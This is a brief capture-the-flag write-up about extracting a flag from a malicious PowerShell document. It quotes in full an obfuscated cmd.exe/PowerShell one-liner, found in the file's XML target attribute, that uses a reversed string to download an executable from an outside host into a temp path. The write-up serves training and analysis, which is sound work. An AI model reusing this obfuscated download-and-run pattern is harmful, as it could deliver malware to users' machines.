## Finding what to look for:
The first thing that comes to mind then when you saw the .pptx format is that its basically a zip file with bunch of stuff in there 

We can unzip it. with that done now i had much more files to work with.

Most of them were common files so looked around and i found lot of urls looking through wiki i found its usage after that it was simple i found something interesting use of target attribute:

```xml=
cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
```

## Decoding 

looking through that cmd that reverse exe stood out like sore thumb so after opening cyberchef using reverse recipe and using magic/base64(on side note base64 didnt work quite right but after trying magic it gave me right flag you have to play around with alphabets )
